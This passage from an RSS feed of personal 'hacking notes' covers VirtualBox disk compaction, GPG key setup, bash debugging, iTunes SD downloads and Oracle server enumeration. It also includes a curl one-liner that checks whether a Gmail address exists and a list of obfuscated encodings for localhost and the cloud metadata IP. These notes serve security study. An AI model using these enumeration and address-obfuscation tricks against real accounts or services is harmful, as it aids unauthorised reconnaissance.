&lt;span id=&quot;cb5-5&quot;&gt;&lt;a href=&quot;#cb5-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ip&lt;/span&gt; address &lt;span class=&quot;va&quot;&gt;$IP_ADDRESS&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$NETMASK&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/slyth11907/Cheatsheets&quot;&gt;slyth11907 / Cheatsheets&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 29 Mar 2023 13:08:35 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Cisco%20IOS%20Cheatsheet.md</guid>
		</item>
		<item>
			<title>Compact VirtualBox Disk Images</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Compact%20VirtualBox%20Disk%20Images.md</link>
			<description>&lt;ol&gt;&lt;li&gt;&lt;p&gt;Zero out free disk space &lt;em&gt;on the guest&lt;/em&gt;:&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Windows:&lt;/strong&gt; Disable the paging file (Settings &amp;gt; System &amp;gt; About &amp;gt; Advanced system settings &amp;gt; Advanced &amp;gt; Performance &amp;gt; Settingsâ¦ &amp;gt; Advanced &amp;gt; Virtual memory &amp;gt; Changeâ¦), clean all temporary files (C: &amp;gt; Properties &amp;gt; Disk Cleanup), defrag (&lt;code&gt;defrag C: /FreespaceConsolidate /Verbose&lt;/code&gt;), and then zero out free space with SDelete (&lt;code&gt;sdelete -z C:&lt;/code&gt;).&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Linux:&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; dd if=/dev/zero of=/temp.zeros bs=4096k&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; rm -f /temp.zeros&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Compact the disk image &lt;em&gt;on the host&lt;/em&gt;:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;vboxmanage&lt;/span&gt; modifymedium /path/to/image.vdi --compact&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Remember to turn the paging file back on after compacting the drive (for Windows guests)!&lt;/p&gt;&lt;p&gt;Note that this only works on a disk image &lt;em&gt;without any snapshots&lt;/em&gt;.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://superuser.com/questions/529149/how-to-compact-virtualboxs-vdi-file-size/529183#529183&quot;&gt;How to compact VirtualBoxâs VDI file size?&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/sysinternals/downloads/sdelete&quot;&gt;SDelete&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 31 Mar 2023 14:10:16 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Compact%20VirtualBox%20Disk%20Images.md</guid>
		</item>
		<item>
			<title>Confirm the Existence of a Gmail Address</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Confirm%20the%20Existence%20of%20a%20Gmail%20Address.md</link>
			<description>&lt;blockquote&gt;&lt;p&gt;Easier way to confirm the existance of a gmail address. If an email address exists, it will send cookie in response.&lt;/p&gt;&lt;p&gt;&lt;code&gt;curl -v &quot;https://mail.google.com/mail/gxlu?email=${USER}@gmail.com&quot;&lt;/code&gt;&lt;/p&gt;&lt;p&gt;â &lt;a href=&quot;https://discord.com/channels/713982578692194389/756722804535066626/858536063769509889&quot;&gt;7oaster on The OSINTion Discord&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;</description>
			<pubDate>Fri, 31 Mar 2023 14:10:16 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Confirm%20the%20Existence%20of%20a%20Gmail%20Address.md</guid>
		</item>
		<item>
			<title>Create a GPG Key (With SSH Support!)</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Create%20a%20GPG%20Key%20%28With%20SSH%20Support%21%29.md</link>
			<description>&lt;h2 id=&quot;create-the-initial-key&quot;&gt;Create the Initial Key&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gpg&lt;/span&gt; --expert --full-generate-key&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;Choose âECC (set your own capabilities)â&lt;/li&gt;&lt;li&gt;Toggle the âSignâ capability &lt;em&gt;off&lt;/em&gt; (&lt;code&gt;S&lt;/code&gt;).&lt;/li&gt;&lt;li&gt;Finish choosing capabilities (&lt;code&gt;Q&lt;/code&gt;).&lt;/li&gt;&lt;li&gt;Choose âCurve 25519â.&lt;/li&gt;&lt;li&gt;Expire in 2 years (&lt;code&gt;2y&lt;/code&gt;).&lt;/li&gt;&lt;li&gt;Enter your name.&lt;/li&gt;&lt;li&gt;Enter the primary email address for the key.&lt;/li&gt;&lt;li&gt;&lt;em&gt;Do not enter a comment.&lt;/em&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;edit-the-key&quot;&gt;Edit the Key&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gpg&lt;/span&gt; --expert --edit-key &lt;span class=&quot;va&quot;&gt;$KEYID&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&quot;add-uids&quot;&gt;Add UIDs&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;Use &lt;code&gt;adduid&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;Enter your name.&lt;/li&gt;&lt;li&gt;Enter the primary email address for the key.&lt;/li&gt;&lt;li&gt;&lt;em&gt;Do not enter a comment.&lt;/em&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;add-a-signing-subkey&quot;&gt;Add a Signing Subkey&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;Use &lt;code&gt;addkey&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;Choose âECC (sign only)â&lt;/li&gt;&lt;li&gt;Choose âCurve 25519â.&lt;/li&gt;&lt;li&gt;Expire in 2 years (&lt;code&gt;2y&lt;/code&gt;).&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;add-an-authentication-subkey&quot;&gt;Add an Authentication Subkey&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;Use &lt;code&gt;addkey&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;Choose âECC (set your own capabilities)â&lt;/li&gt;&lt;li&gt;Toggle the âSignâ capability &lt;em&gt;off&lt;/em&gt; (&lt;code&gt;S&lt;/code&gt;).&lt;/li&gt;&lt;li&gt;Toggle the âAuthenticateâ capability on (&lt;code&gt;A&lt;/code&gt;).&lt;/li&gt;&lt;li&gt;Finish choosing capabilities (&lt;code&gt;Q&lt;/code&gt;).&lt;/li&gt;&lt;li&gt;Choose âCurve 25519â.&lt;/li&gt;&lt;li&gt;Expire in 2 years (&lt;code&gt;2y&lt;/code&gt;).&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;add-an-encryption-subkey&quot;&gt;Add an Encryption Subkey&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;Use &lt;code&gt;addkey&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;Choose âECC (encrypt only)â&lt;/li&gt;&lt;li&gt;Choose âCurve 25519â.&lt;/li&gt;&lt;li&gt;Expire in 2 years (&lt;code&gt;2y&lt;/code&gt;).&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;finish-up&quot;&gt;Finish Up&lt;/h3&gt;&lt;p&gt;Be sure to save the key before exiting.&lt;/p&gt;&lt;h2 id=&quot;remove-the-primary-key-for-safe-keeping&quot;&gt;Remove the Primary Key for Safe Keeping&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Export keys&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gpg&lt;/span&gt; --armor --export-secret-key &lt;span class=&quot;va&quot;&gt;$KEYID&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$KEYID&lt;/span&gt;.asc&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gpg&lt;/span&gt; --export-secret-subkeys &lt;span class=&quot;va&quot;&gt;$KEYID&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; subkeys.gpg&lt;/span&gt;
&lt;span id=&quot;cb3-5&quot;&gt;&lt;a href=&quot;#cb3-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-6&quot;&gt;&lt;a href=&quot;#cb3-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Delete secret keys (BOTH primary and subkeys)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-7&quot;&gt;&lt;a href=&quot;#cb3-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-8&quot;&gt;&lt;a href=&quot;#cb3-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gpg&lt;/span&gt; --delete-secret-keys &lt;span class=&quot;va&quot;&gt;$KEYID&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-9&quot;&gt;&lt;a href=&quot;#cb3-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-10&quot;&gt;&lt;a href=&quot;#cb3-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Re-import secret subkeys&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-11&quot;&gt;&lt;a href=&quot;#cb3-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-12&quot;&gt;&lt;a href=&quot;#cb3-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gpg&lt;/span&gt; --import subkeys.gpg&lt;/span&gt;
&lt;span id=&quot;cb3-13&quot;&gt;&lt;a href=&quot;#cb3-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-14&quot;&gt;&lt;a href=&quot;#cb3-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Optionally verify that eveything worked...&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-15&quot;&gt;&lt;a href=&quot;#cb3-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-16&quot;&gt;&lt;a href=&quot;#cb3-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gpg&lt;/span&gt; --list-keys&lt;/span&gt;
&lt;span id=&quot;cb3-17&quot;&gt;&lt;a href=&quot;#cb3-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gpg&lt;/span&gt; --list-secret-keys&lt;/span&gt;
&lt;span id=&quot;cb3-18&quot;&gt;&lt;a href=&quot;#cb3-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-19&quot;&gt;&lt;a href=&quot;#cb3-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Cleanup&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-20&quot;&gt;&lt;a href=&quot;#cb3-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-21&quot;&gt;&lt;a href=&quot;#cb3-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;rm&lt;/span&gt; subkeys.gpg&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once this is done, &lt;code&gt;$KEYID.asc&lt;/code&gt; can be stored âofflineâ on a secure (encrypted!) drive, etc. Note that this key will need to be re-imported to generate new subkeys, add UIDs, extend expiration dates, or create updated revocation certificates.&lt;/p&gt;&lt;h2 id=&quot;export-the-authentication-subkey-to-ssh&quot;&gt;Export the Authentication Subkey to SSH&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;Run &lt;code&gt;gpg --list-secret-keys --with-keygrip&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;Copy keygrips of the authentication subkeys (&lt;code&gt;[A]&lt;/code&gt;) you want to use in SSH to &lt;code&gt;~/.gnupg/sshcontrol&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;Generate the SSH public key using &lt;code&gt;gpg --export-ssh-key $KEYID &amp;gt; ~/.ssh/id_${KEYID}.pub&lt;/code&gt;. This key can then be referenced using the &lt;code&gt;IdentityFile&lt;/code&gt; directive in &lt;code&gt;~/.ssh/config&lt;/code&gt; or inserted into a hostâs &lt;code&gt;~/.ssh/authorized_keys&lt;/code&gt; file.&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.gniibe.org/memo/software/gpg/keygen-25519.html&quot;&gt;Creating newer ECC keys for GnuPG&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://riseup.net/en/security/message-security/openpgp/best-practices&quot;&gt;OpenPGP Best Practices&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://opensource.com/article/19/4/gpg-subkeys-ssh&quot;&gt;How to enable SSH access using a GPG key for authentication&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://serverfault.com/a/964317&quot;&gt;Force the use of a gpg-key as an ssh-key for a given server&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 31 Mar 2023 14:10:16 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Create%20a%20GPG%20Key%20%28With%20SSH%20Support%21%29.md</guid>
		</item>
		<item>
			<title>Debugging Bash Scripts</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Debugging%20Bash%20Scripts.md</link>
			<description>&lt;p&gt;Using the -x flag will force bash to output each line of the shell script youâre running before that line is executed. This can be useful for debugging.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;bash&lt;/span&gt; -x ./script.sh&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The -x flag can also be incorporated into the interpreter line.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#!/usr/bin/env bash -x&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Script content...&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally, this mode can be toggled on and off with the &lt;code&gt;set&lt;/code&gt; command within the script itself.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#!/usr/bin/env bash&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Some script content...&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-5&quot;&gt;&lt;a href=&quot;#cb3-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;-x&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-6&quot;&gt;&lt;a href=&quot;#cb3-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-7&quot;&gt;&lt;a href=&quot;#cb3-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# These lines will be echoed before execution.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-8&quot;&gt;&lt;a href=&quot;#cb3-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-9&quot;&gt;&lt;a href=&quot;#cb3-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;+x&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-10&quot;&gt;&lt;a href=&quot;#cb3-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-11&quot;&gt;&lt;a href=&quot;#cb3-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# These lines will not be echoed...&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Frequently &lt;code&gt;set -x&lt;/code&gt; is used at the start of a script without a closing &lt;code&gt;set +x&lt;/code&gt;, which will just cause all lines of the script to be echoed back before execution.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/bashscripting&quot;&gt;TryHackMe: Bash Scripting&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 31 Mar 2023 14:10:16 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Debugging%20Bash%20Scripts.md</guid>
		</item>
		<item>
			<title>Different Representations of IPv4 Addresses</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Different%20Representations%20of%20IPv4%20Addresses.md</link>
			<description>&lt;p&gt;Localhost can be represented in a lot of different ways.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;localhost&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;127.0.0.1&lt;/code&gt; (IPv4 address)&lt;/li&gt;&lt;li&gt;&lt;code&gt;[::]&lt;/code&gt; or &lt;code&gt;::&lt;/code&gt; (IPv6 address)&lt;/li&gt;&lt;li&gt;&lt;code&gt;2130706433&lt;/code&gt; (IPv4 in decimal)&lt;/li&gt;&lt;li&gt;&lt;code&gt;0x7f000001&lt;/code&gt; (IPv4 in hexadecimal)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The last two of these are particularly interesting â IPv4 addresses can be represented as plain numbers!&lt;/p&gt;&lt;p&gt;Decimal/Hexidecimal conversion for IPv4 addresses is relatively simple if you remember that we break IPv4 addresses up into 4 &lt;em&gt;octets&lt;/em&gt;, where each octet is 8 binary digits. Thus&lt;/p&gt;&lt;pre&gt;&lt;code&gt;127.0.0.1 = (127 Ã 2Â²â´) + (0 Ã 2Â¹â¶) + (0 Ã 2â¸) + (1 Ã 2â°)
          = 2130706432 + 0 + 0 + 1
          = 2130706433
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Converting to hexadecimal is trivial using the excellent &lt;a href=&quot;https://qalculate.github.io/&quot;&gt;Qalculate!&lt;/a&gt; tool.&lt;/p&gt;&lt;pre class=&quot;qalc&quot;&gt;&lt;code&gt;2130706433 to hex = 0x7F000001
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/web&quot;&gt;TryHackMe: Web Fundamentals&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;common-ip-addresses&quot;&gt;Common IP Addresses&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;localhost â 127.0.0.1 â 0x7F000001 â 2130706433 (decimal)
169.254.169.254 â 0xA9FEA9FE â 2852039166 (decimal)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;169.254.169.254 is often used in to reference configuration data in cloud systems (just AWS?).&lt;/p&gt;&lt;p&gt;The &lt;a href=&quot;https://nip.io/&quot;&gt;nip.io&lt;/a&gt; service can be used to provide a domain name for an arbitrary IP address.&lt;/p&gt;</description>
			<pubDate>Fri, 31 Mar 2023 14:10:16 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Different%20Representations%20of%20IPv4%20Addresses.md</guid>
		</item>
		<item>
			<title>Download SD Movies in iTunes</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Download%20SD%20Movies%20in%20iTunes.md</link>
			<description>&lt;p&gt;Sometimes you donât want to download the 1080p, or even 720p, version of a movie or TV show in iTunes. Maybe your connection is slow, or your computer is old, or you just want to get that old DVD feeling.&lt;/p&gt;&lt;p&gt;Unfortunately, iTunes can be stubborn about this, even when youâve unchecked âDownload full-sized HD videosâ and checked âDownload high-quality SD videosâ in the âDownloadsâ tab of the preferences.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://discussions.apple.com/thread/6516175?answerId=26546126022#26546126022&quot;&gt;Download Lower Resolution Show&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;downloading-movies-and-entire-tv-series-as-sd&quot;&gt;Downloading Movies and Entire TV Series as SD&lt;/h2&gt;&lt;p&gt;This is the easiest way to grab SD content:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Go to the Store.&lt;/li&gt;&lt;li&gt;Click on âPurchasedâ in the middle of the right-hand sidebar.&lt;/li&gt;&lt;li&gt;Make sure youâre on either the âMoviesâ or âTV Showsâ tab.&lt;/li&gt;&lt;li&gt;Uncheck the âDownload HD When Availableâ box in the lower right of the tab.&lt;/li&gt;&lt;li&gt;Download the movie or &lt;em&gt;full&lt;/em&gt; TV series FROM THIS PAGE. If you switch back to your library, youâll download the HD version - you &lt;em&gt;must&lt;/em&gt; download the SD version from the âPurchasedâ page.&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;downloading-individual-tv-show-episodes&quot;&gt;Downloading Individual TV Show Episodes&lt;/h2&gt;&lt;p&gt;For TV shows, you can also download individual episodes in SD, but you need to use a different method.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Expand the TV show you want to download.&lt;/li&gt;&lt;li&gt;Select the season of the episode you want to download.&lt;/li&gt;&lt;li&gt;Right-click on any episode of the season, and choose âShow in iTunes Storeâ.&lt;/li&gt;&lt;li&gt;In the left-hand sidebar, toggle from HD to SD (just below the series cover).&lt;/li&gt;&lt;li&gt;Download individual episodes FROM THIS PAGE. Again, if you switch back to your library, youâll download the HD version instead.&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 31 Mar 2023 14:10:16 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Download%20SD%20Movies%20in%20iTunes.md</guid>
		</item>
		<item>
			<title>Enumerate Oracle SQL Server</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Enumerate%20Oracle%20SQL%20Server.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Ping an Oracle server, get version information, etc.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;tnscmd10g&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$COMMAND&lt;/span&gt; -h &lt;span class=&quot;va&quot;&gt;$IP_ADDRESS&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
